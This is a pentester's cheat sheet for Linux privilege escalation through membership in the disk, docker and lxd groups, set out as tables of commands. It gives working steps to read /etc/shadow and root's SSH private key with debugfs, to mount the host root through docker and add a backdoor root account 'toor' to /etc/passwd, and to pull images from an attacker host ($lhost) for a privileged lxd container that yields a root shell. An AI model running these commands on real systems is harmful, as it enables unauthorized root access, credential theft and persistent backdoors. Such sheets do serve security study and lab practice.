# Groups

## Disk

| Info                      | Command                          |
| ------------------------- | -------------------------------- |
| Find where "/" is mounted | `df -h`                          |
| Connect using debugfs     | `debugfs /dev/sda1`              |
| Change to root            | `debugfs: cd /root`              |
| List files                | `debugfs: ls`                    |
| View root certificate     | `debugfs: cat /root/.ssh/id_rsa` |
| View shadow file          | `debugfs: cat /etc/shadow`       |

## Docker

| Info                                                                                 | Command                                                                                            |
| ------------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------- |
| Get images from the docker service                                                   | `docker image ls`                                                                                  |
| Get a shell inside a docker container with access as root to the filesystem          | `docker run -it --rm -v /:/mnt $imagename chroot /mnt bash`                                        |
| If you want full access from the host, create a backdoor in the passwd file          | `echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd`             |
| If you just want filesystem and network access you can start the following container | `docker run --rm -it --pid=host --net=host --privileged -v /:/mnt $imagename chroot /mnt bashbash` |

## LXD

| Info                         | Command                                                                               |
| ---------------------------- | ------------------------------------------------------------------------------------- |
| Download images              | `wget http://$lhost/linux/privesc/lxd/lxd.tar.xz`                                     |
| Download images              | `wget http://$lhost/linux/privesc/lxd/rootfs.squashfs`                                |
| Import images                | `lxc image import lxd.tar.xz rootfs.squashfs --alias alpine`                          |
| Show imported image          | `lxc image list`                                                                      |
| Initialze the container      | `lxc init alpine privesc -c security.privileged=true`                                 |
| Create storage if needed     | `lxd init`                                                                            |
| Mount the local file system  | `lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true` |
| Start the container          | `lxc start privesc`                                                                   |
| Get a shell in the container | `lxc exec privesc /bin/sh`                                                            |
